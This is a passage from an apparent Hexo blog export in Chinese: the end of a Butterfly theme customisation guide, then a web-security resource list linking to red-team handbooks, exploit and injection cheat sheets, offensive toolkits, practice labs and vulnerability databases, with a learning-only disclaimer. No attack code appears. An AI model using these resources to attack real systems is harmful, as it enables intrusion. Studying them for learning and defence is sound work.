&quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;144.png&quot;,</span><br><span class="line">          &quot;sizes&quot;: &quot;144x144&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;192.png&quot;,</span><br><span class="line">          &quot;sizes&quot;: &quot;192x192&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;512.png&quot;,</span><br><span class="line">            &quot;sizes&quot;: &quot;512x512&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">          &#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;splash_pages&quot;: null &#x2F;&#x2F;配置自定义启动动画。</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>   你也可以通过</p><p>   Web App Nabufest</p><p>   快速创建</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manifest.json</span><br></pre></td></tr></table></figure><p>   。(Web App Manifest要求至少包含一个512*512像素的图标）</p><ol start="6"><li><p>可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chrome</span><br></pre></td></tr></table></figure><p>插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lighthouse</span><br></pre></td></tr></table></figure><p>检查PWA配置是否生效以及配置是否正确。</p><ul><li>打开博客页面</li><li>启动<code>Lighthouse</code>插件(<code>Lighthouse</code>插件要求至少包含一个512*512像素的图标)<br>关于PWA(渐进式增强Web应用)的更多内容请参阅<a href="https://developers.google.com/web/tools/lighthouse/audits/address-bar">Google Tools for Web Developers</a></li></ul></li></ol><h2 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h2><p>要为<code>Butterfly</code>配上数字统计特性，你需要如下几个步骤：</p><ol><li>打开hexo工作目录</li><li><code>npm install hexo-wordcount --save</code>or<code>yarn add hexo-wordcount</code></li><li>配置<code>butterfly.yml</code></li></ol><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wordcount:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h2 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h2><p>要为你一些文章置顶，你需要如下步骤:</p><ol><li>打开hexo工作目录</li><li><code>npm uninstall hexo-genrator-index --save</code>然后<code>npm install hexo-generator-index-pin-top --save</code></li><li>你要在文章的<code>front-matter</code>区域里添加<code>top: True</code>属性来把这篇文章置顶。</li><li>你可以参考<a href="https://github.com/netcan/hexo-generator-index-pin-top">hexo-generator-index-pin-top</a>这个仓库来了解更多细节。</li></ol><p>举个例子：</p><p>你的莫篇文章开头如下:</p><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">tags: </span><br><span class="line">    - xxx</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">---</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>现在把<code>top: true</code>加进去:</p><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">tags: </span><br><span class="line">    - xxx</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">top: True</span><br><span class="line">---</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><h2 id="图片大图查看模式"><a href="#图片大图查看模式" class="headerlink" title="图片大图查看模式"></a>图片大图查看模式</h2><p>默认为fancybox，可以选择改为medium_zoom</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medium_zoom:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h3 id="Snackbar弹窗"><a href="#Snackbar弹窗" class="headerlink" title="Snackbar弹窗"></a>Snackbar弹窗</h3><p>Snackbar弹窗，根据自己爱好开启</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Snackbar 弹窗</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;polonel&#x2F;SnackBar</span><br><span class="line"># position 弹窗位置</span><br><span class="line"># 可选 top-left &#x2F; top-center &#x2F; top-right &#x2F; bottom-left &#x2F; bottom-center &#x2F; bottom-right</span><br><span class="line">snackbar:</span><br><span class="line">  enable: true</span><br><span class="line">  position: bottom-left</span><br><span class="line">  bg_light: &#39;#49b1f5&#39; #light mode时弹窗背景</span><br><span class="line">  bg_dark: &#39;#2d3035&#39; #dark mode时弹窗背景</span><br></pre></td></tr></table></figure><h1 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h1><p>申请对应的域名并绑定到Github和Coding上，可以查看该博文</p><p><a href="https://www.cnblogs.com/milovetingting/p/12159100.html">https://www.cnblogs.com/milovetingting/p/12159100.html</a></p><h1 id="地球"><a href="#地球" class="headerlink" title="地球"></a>地球</h1><h2 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h2><p>官网 <a href="https://clustrmaps.com/">clustrmaps.com</a> 也是第三方的，有Google Docs账号可以直接登录，Sign up即可，科学上网这里不教。<br>注册之后，在官网找到 Website Widget，如图。</p><img src="hexo-buttfly-美化/20200505000231389.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>我喜欢Globe widget，请自行选择。</p><img src="hexo-buttfly-美化/20200504230609405.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/>点击select就可以看到信息了，我这里用的博客里用的js版，复制到你的博客就好了。<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><blockquote><p>我在butterfly（pug）的侧边栏引入的，next可以同理规划；sakura（ejs）更简单，直接贴js或html代码</p></blockquote><ol><li><p>在主题配置声明一个侧边栏给地图显示<br>文件：<code>source\_data\butterfly.yml</code></p><p>在aside: 字段下添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">card_maps: <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol><p>   先在加载框添加一条card_maps的声明，（主题控制是否显示这个界面元素）<br>   修改添加：<code>themes\Butterfly\layout\includes\widget\index.pug</code></p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.aside.card_maps</span><br><span class="line">       !=partial(<span class="string">&#x27;includes/widget/card_maps&#x27;</span>, &#123;&#125;, &#123;cache:theme.fragment_cache&#125;)</span><br></pre></td></tr></table></figure><p>   然后，<strong>新建</strong> 一个页面元素：<code>themes\Butterfly\layout\includes\widget\card_maps.pug</code><br>   复制下面的pug格式样式，将url_for改为你之前申请的，例如我的是：</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; id&#x3D;&quot;clstr_globe&quot; src&#x3D;&quot;&#x2F;&#x2F;cdn.clustrmaps.com&#x2F;globe.js?d&#x3D;0pAHW6anrierwVkDn2noQLY7_BJegnXt2KYvXQ6Tuu4&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 主题优化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> butterfly主题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全————资源分享</title>
      <link href="2020/12/05/data_list/"/>
      <url>2020/12/05/data_list/</url>
      
        <content type="html"><![CDATA[<h2 id="声明：本资源只供学习参考之用，请勿用于其它用途，本人概不负责"><a href="#声明：本资源只供学习参考之用，请勿用于其它用途，本人概不负责" class="headerlink" title="声明：本资源只供学习参考之用，请勿用于其它用途，本人概不负责"></a>声明：本资源只供学习参考之用，请勿用于其它用途，本人概不负责</h2><h3 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表"></a>相关资源列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mitre-attack.github.io&#x2F; mitre 科技机构对攻击技术的总结 wiki</span><br><span class="line">https:&#x2F;&#x2F;huntingday.github.io MITRE | ATT&amp;CK 中文站</span><br><span class="line">https:&#x2F;&#x2F;arxiv.org 康奈尔大学（Cornell University）开放文档</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.cn&#x2F;owasp-project&#x2F;owasp-things OWASP 项目</span><br><span class="line">http:&#x2F;&#x2F;www.irongeek.com&#x2F;i.php?page&#x3D;security&#x2F;hackingillustrated 国内外安全大会相关视频与文档</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;KCon KCon 大会文章 PPT</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;sec-chart 各种相关安全思维导图集合</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;RD_Checklist 知道创宇技能列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ChrisLinn&#x2F;greyhame-2017 灰袍技能书 2017 版本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Hack-with-Github&#x2F;Awesome-Hacking GitHub 万星推荐：黑客成长技术清单</span><br></pre></td></tr></table></figure><h3 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册"></a>攻防测试手册</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;micropoor.blogspot.com&#x2F;2019&#x2F;01&#x2F;php8.html PHP 安全新闻早 8 点课程系列高持续渗透--Microporor</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Micropoor&#x2F;Micro8 Microporor 高级攻防 100 课</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maskhed&#x2F;Papers 包含 100 课等经典攻防教材、安全知识</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;AD-Attack-Defense 红蓝方攻防手册</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yeyintminthuhtut&#x2F;Awesome-Red-Teaming 优秀红队资源列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;foobarto&#x2F;redteam-notebook 红队标准渗透测试流程+常用命令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tom0li&#x2F;collection-document 文章收集：安全部、SDL、src、渗透测试</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kbandla&#x2F;APTnotes 各种公开的文件和相关的 APT 笔记，还有软件样本</span><br><span class="line">https:&#x2F;&#x2F;wizardforcel.gitbooks.io&#x2F;web-hacking-101&#x2F;content Web Hacking 101 中文版</span><br><span class="line">https:&#x2F;&#x2F;techvomit.net&#x2F;web-application-penetration-testing-notes&#x2F; web 渗透测试笔记</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;qazbnm456&#x2F;awesome-web-security Web 安全资料和资源列表</span><br><span class="line">http:&#x2F;&#x2F;pentestmonkey.net&#x2F;category&#x2F;cheat-sheet 渗透测试常见条目</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;demonsec666&#x2F;Security-Toolkit 渗透攻击链中常用工具及使用场景</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kinimiwar&#x2F;Penetration-Testing 渗透测试方向优秀资源收集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jshaw87&#x2F;Cheatsheets 渗透测试&#x2F;安全秘籍&#x2F;笔记</span><br></pre></td></tr></table></figure><h3 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档"></a>内网安全文档</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;attack.mitre.org&#x2F;wiki&#x2F;Lateral_Movement mitre 机构对横向移动的总结</span><br><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2018-11-30&#x2F;1 彻底理解Windows 认证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;klionsec&#x2F;klionsec.github.io 内网大牛的学习历程</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;l3m0n&#x2F;pentest_study 从零开始内网渗透学习</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;Intranet_Penetration_Tips 内网渗透 TIPS</span><br></pre></td></tr></table></figure><h3 id="学习手册相关资源"><a href="#学习手册相关资源" class="headerlink" title="学习手册相关资源"></a>学习手册相关资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;HarmJ0y&#x2F;CheatSheets 多个项目的速查手册（Beacon &#x2F; Cobalt Strike，PowerView，PowerUp，Empire 和 PowerSploit）</span><br><span class="line">https:&#x2F;&#x2F;wizardforcel.gitbooks.io&#x2F;kali-linux-web-pentest-cookbook&#x2F;content&#x2F; Kali Linux Web 渗透测试秘籍 中文版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;louchaooo&#x2F;kali-tools-zh kali 下工具使用介绍手册</span><br><span class="line">https:&#x2F;&#x2F;www.offensive-security.com&#x2F;metasploit-unleashed&#x2F; kali 出的 metasploit 指导笔记</span><br><span class="line">http:&#x2F;&#x2F;www.hackingarticles.in&#x2F;comprehensive-guide-on-hydra-a-brute-forcing-tool&#x2F; hydra使用手册</span><br><span class="line">https:&#x2F;&#x2F;www.gitbook.com&#x2F;book&#x2F;t0data&#x2F;burpsuite&#x2F;details burpsuite 实战指南</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;26618074 Nmap 扩展脚本使用方法</span><br><span class="line">https:&#x2F;&#x2F;somdev.me&#x2F;21-things-xss&#x2F; XSS 的 21 个扩展用途</span><br><span class="line">https:&#x2F;&#x2F;www.netsparker.com&#x2F;blog&#x2F;web-security&#x2F;sql-injection-cheat-sheet&#x2F; sql 注入 sheet 表</span><br><span class="line">https:&#x2F;&#x2F;sqlwiki.netspi.com&#x2F; 你要的 sql 注入知识点都能找到</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kevins1022&#x2F;SQLInjectionWiki 一个专注于聚合和记录各种 SQL 注入方法的 wiki</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hardenedlinux&#x2F;linux-exploit-development-tutorial Linux exploit 开发入门</span><br><span class="line">https:&#x2F;&#x2F;wizardforcel.gitbooks.io&#x2F;asani&#x2F;content 浅入浅出 Android 安全 中文版</span><br><span class="line">https:&#x2F;&#x2F;wizardforcel.gitbooks.io&#x2F;lpad&#x2F;content Android 渗透测试学习手册 中文版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;writeups&#x2F;ios ios 漏洞 writeup 笔记</span><br><span class="line">http:&#x2F;&#x2F;blog.safebuff.com&#x2F;2016&#x2F;07&#x2F;03&#x2F;SSRF-Tips&#x2F; ssrf 漏洞利用手册</span><br></pre></td></tr></table></figure><h3 id="学习靶场"><a href="#学习靶场" class="headerlink" title="学习靶场"></a>学习靶场</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.blackmoreops.com&#x2F;2018&#x2F;11&#x2F;06&#x2F;124-legal-hacking-websites-to-practice-and-learn&#x2F; 124 个合法的可以练习 Hacking 技术的网站</span><br><span class="line">https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;267204109 学 web 安全去哪里找各种各样的靶场？</span><br><span class="line">https:&#x2F;&#x2F;www.vulnhub.com 许多 ctf 靶机汇总</span><br><span class="line">https:&#x2F;&#x2F;www.wechall.net 世界知名 ctf 汇总交流网站</span><br><span class="line">https:&#x2F;&#x2F;www.xssgame.com 谷歌 XSS 挑战</span><br><span class="line">http:&#x2F;&#x2F;xss.tv 在线靶场挑战</span><br><span class="line">https:&#x2F;&#x2F;www.hackthebox.eu 在线靶场挑战</span><br><span class="line">https:&#x2F;&#x2F;www.root-me.org 在线靶场挑战</span><br><span class="line">http:&#x2F;&#x2F;www.itsecgames.com bWAPP，包含 100 多种漏洞环境</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;vulstudy 多种漏洞复现系统的 docker 汇总</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bkimminich&#x2F;juice-shop 常见 web 安全实验靶场市场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ethicalhack3r&#x2F;DVWA web 安全实验靶场</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;123779.html 新手指南：DVWA-1.9 全级别教程</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;78778443&#x2F;permeate php，常见漏洞靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gh0stkey&#x2F;DoraBox php,常见漏洞靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stamparm&#x2F;DSVW py2,常见漏洞靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;amolnaik4&#x2F;bodhi py,常见漏洞靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Safflower&#x2F;Solve-Me php，韩国一个偏代码审计的 ctf 靶场源码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat 一键 jar 包，web 安全实验靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs 基于 SQLite 的 sql 注入学习靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lcamry&#x2F;sqli-labs 通过 sqli-labs 演示 mysql 相关的注入手法</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs 一个帮你总结所有类型的上传漏洞的靶场</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LandGrey&#x2F;upload-labs-writeup upload-labs 指导手册</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Go0s&#x2F;LFIboomCTF 本地文件包含漏洞&amp;&amp;PHP 利用协议&amp;&amp;实践源码</span><br><span class="line">https:&#x2F;&#x2F;in.security&#x2F;lin-security-practise-your-linux-privilege-escalation-foo&#x2F; 一个虚拟机文件用于 linux 提权练习</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OWASP&#x2F;igoat 适用于 ios 应用程序测试和安全性的学习工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;prateek147&#x2F;DVIA-v2 适用于 ios 应用程序测试和安全性的学习工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploitable3 metasploit 练习系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-vulnerability-emulator 基于 perl 的 metasploit 模拟环境，练习操作</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chryzsh&#x2F;DarthSidious AD 域环境的搭建、渗透、防护</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;xxe-lab 一个包含 php,java,python,C#等各种语言版本的 XXE 漏洞 Demo</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub Vulhub 是一个面向大众的开源漏洞靶场，无需 docker 知识，执行两条命令即可编译、运行一个完整的漏洞靶场镜像</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Medicean&#x2F;VulApps 收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bingohuang&#x2F;docker-labs 制作在线 docker 平台</span><br></pre></td></tr></table></figure><h3 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库"></a>开源漏洞库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wooyun.kieran.top&#x2F;#!&#x2F; 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F; 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</span><br><span class="line">https:&#x2F;&#x2F;dvpnet.io&#x2F;list&#x2F;index&#x2F;state&#x2F;3 公开漏洞详情文章</span><br><span class="line">https:&#x2F;&#x2F;sec.ly.com&#x2F;bugs 同程安全公开漏洞详情文章</span><br><span class="line">http:&#x2F;&#x2F;ics.cnvd.org.cn 中国国家工控漏洞库</span><br><span class="line">https:&#x2F;&#x2F;ics-cert.us-cert.gov&#x2F;advisories 美国国家工控漏洞库</span><br><span class="line">http:&#x2F;&#x2F;www.nsfocus.net&#x2F;index.php?act&#x3D;sec_bug 绿盟漏洞库，含工控</span><br><span class="line">http:&#x2F;&#x2F;ivd.winicssec.com&#x2F; 威努特工控漏洞库</span><br><span class="line">http:&#x2F;&#x2F;cve.scap.org.cn&#x2F;view&#x2F;ics CVE 中文工控漏洞库</span><br><span class="line">https:&#x2F;&#x2F;cve.mitre.org&#x2F;cve&#x2F;search_cve_list.html 美国 MITRE 公司负责维护的 CVE 漏洞库</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com 美国 Offensive Security 的漏洞库</span><br><span class="line">https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;search 美国国家信息安全漏洞库</span><br></pre></td></tr></table></figure><h3 id="工具包集合"><a href="#工具包集合" class="headerlink" title="工具包集合"></a>工具包集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.4hou.com&#x2F;web&#x2F;11241.html 史上最全攻击模拟工具盘点</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;Red-Teaming-Toolkit 信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、清理痕迹</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;toolswatch&#x2F;blackhat-arsenal-tools 黑帽大会工具集</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;k8gege K8 哥哥工具包集合。解压密码 Kk8team,Kk8gege</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n00py&#x2F;ReadingList&#x2F;blob&#x2F;master&#x2F;gunsafe.txt 安全工具集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;Pentest 安全工具集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;redcanaryco&#x2F;atomic-red-team win、linux、mac 等多方面 apt 利用手段、技术与工具集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Cooolis&#x2F;Cooolis.github.io Cooolis 是一个操作系统命令技巧备忘录，https:&#x2F;&#x2F;cooolis.payloads.online</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LOLBAS-Project&#x2F;LOLBAS 常见的渗透测试利用的脚本与二进制文件集合</span><br><span class="line">https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;File:CSRFTester-1.0.zip csrf 验证工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ufrisk&#x2F;MemProcFS 以访问文件系统的方式访问物理内存, 可读写, 有易于使用的接口. 当前支持 Windows</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vletoux&#x2F;SpoolerScanner 检测 Windows 远程打印机服务是否开启的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sirpsycho&#x2F;firecall 直接向 CiscoASA 防火墙发送命令, 无需登录防火墙后再做修改</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jboss-javassist&#x2F;javassist 能够操作字节码框架，通过它我们能很轻易的修改 class 代码文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ConsenSys&#x2F;mythril-classic 用于以太坊智能协议的安全分析工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;a13xp0p0v&#x2F;kconfig-hardened-check 用于检查 Linux 内核配置中的安全加固选项的脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lionsoul2014&#x2F;ip2region ip 地址定位库，支持 python3 等多接口。类比 geoip</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m101&#x2F;hsploit 基于 rust 的 HEVD 漏洞利用程序</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ticarpi&#x2F;jwt_tool 针对 json web token 的检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;clr2of8&#x2F;DPAT 域密码配置审计</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chenjj&#x2F;CORScanner 域解析漏洞，跨域扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dienuet&#x2F;crossdomain 域解析漏洞，跨域扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sfan5&#x2F;fi6s ipv6 端口快速扫描器</span><br><span 